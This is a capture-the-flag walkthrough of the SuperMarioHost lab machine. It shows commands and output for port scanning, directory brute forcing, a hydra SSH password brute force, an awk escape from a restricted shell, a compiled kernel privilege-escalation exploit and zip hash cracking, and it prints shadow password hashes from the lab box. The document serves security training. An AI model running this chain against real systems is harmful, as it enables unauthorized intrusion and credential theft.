root@kali ~# nmap -sS -T4 -p- 10.0.0.23

PORT     STATE SERVICE
22/tcp   open  ssh                                                                                        
8180/tcp open  unknown 

Going to http://10.0.0.23:8180 there is nothing intersting or useful, let's try to directory brute force.

root@kali ~# gobuster dir -u http://10.0.0.23:8180/ -w /usr/share/wordlists/dirb/common.txt

We found nothing. Let's try a different worlist.

root@kali ~# gobuster dir -u http://10.0.0.23:8180/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

/vhosts               (Status: 200) [Size: 1364]

http://10.0.0.23:8180/vhosts:

ServerName mario.supermariohost.local
ServerAdmin webmaster@localhost
DocumentRoot /var/www/supermariohost
DirectoryIndex mario.php

After adding 10.0.0.23 mario.supermariohost.local to /etc/hosts, we can go to mario.supermariohost.local:8180. This time the site has some functionality but nothing intersting. I tried to brute force the directories once again but found nothing. I tired to look for hidden php,txt,html files.

root@kali ~/D/C/S/keys# gobuster dir -u http://mario.supermariohost.local:8180/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html

/mario.php            (Status: 200) [Size: 7080]
/command.php          (Status: 200) [Size: 231]
/luigi.php            (Status: 200) [Size: 386]

mario.php is the homepage. Going to command.php, it says it finds users but all it does is spuot out random output, so nothing intersting here.

luigi.php:

Hey!! It'sa Luiiiggiii!!
My short brother doesn't know that I'm wandering around his host and messing around, he's new with computers!
Since I'm here I want to tell you more about myself...my brother is a nice person but we are in love for the same person: Princess Peach! I hope she will find out about this.
I Love Peach
Forever yours,
Luigi

This means we know about 3 possible users: mario, luigi and peach. Let's try to brute force SSH with those users.

root@kali ~/D/C/SUPER_MARIO_HOST [255]# hydra -L usernames.txt -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.23 -IV

luigi:luigi1

Logging in to the machine via ssh we are spawned with a restricted shell.
It seems like Mario has left Luigi a message.
message:

YOU BROTHER! YOU!! 
I had to see it coming!!
Not only you declare your love for Pricess Peach, my only love and reason of life (and lives, depending from the player), but you also mess with my server!
So here you go, in a limited shell! Now you can't do much, MUHAUHAUHAUHAA

Mario.

Using '?' we can see what commands we are allowed to run. 

luigi:~$ ?
awk  cat  cd  clear  echo  exit  help  history  ll  lpath  ls  lsudo  vim

'awk' is one of them.
Searching for awk privilege escalation, I found a post from GTFbins https://gtfobins.github.io/gtfobins/awk/

luigi:~$ awk 'BEGIN {system("/bin/sh")}'
$pwd
/home/luigi

Let's spawn a shell with python.
python3 -c 'import pty; pty.spawn("/bin/bash")'

luigi@supermariohost:~$ uname -a
Linux supermariohost 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux

I found a kernel expliot that allowed me to get root ---> https://www.exploit-db.com/exploits/37292

luigi@supermariohost:/tmp$ gcc ofs.c -o ./ofs
luigi@supermariohost:/tmp$ ./ofs
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# whoami
root

Going to /root we find a zip file that is holding the flag, but it requires a password. I downloaded it to my localmachine and by using zip2john I was able to find the password for the zip file.

root@kali ~/D/C/SUPER_MARIO_HOST [80]# zip2john flag.zip > zip.hashes
root@kali ~/D/C/SUPER_MARIO_HOST [1]# john zip.hashes -w=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ilovepeach       (flag.zip/flag.txt)     
1g 0:00:00:00 DONE (2022-03-03 13:08) 20.00g/s 10158Kp/s 10158Kc/s 10158KC/s ininin..happyfun
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

password for zip file ---> ilovepeach

flag.txt:
Well done :D If you reached this it means you got root, congratulations.
Now, there are multiple ways to hack this machine. The goal is to get all the passwords of all the users in this machine. If you did it, then congratulations, I hope you had fun :D

Keep in touch on twitter through @mr_h4sh

Congratulations again!

mr_h4sh

Let's try to get all the passwords: mario root

root:$6$ZmdseK46$FTvRqEZXdr3DCX2Vd6CXWmWAOJYIjcAI6XQathO3/wgvHEoyeP6DwL3NHZy903HXQ/F2uXiTXrhETX19/txbA1:17248:0:99999:7:::

mario:$6$WG.vWiw8$OhoMhuAHSqPYTu1wCEWNc4xoUyX6U/TrLlK.xyhRKZB3SyCtxMDSoQ6vioNvpNOu78kQVTbwTcHPQMIDM2CSJ.:17248:0:99999:7:::

/.bak/users/luigi/message:

Hi Luigi,

Since you've been messing around with my host, at this point I want to return the favour.
This is a "war", you "naughty" boy!

Mario.

Found ssh keys.

Because we are the root user we can play with the permissions of the ssh keys and download them to our localhost.

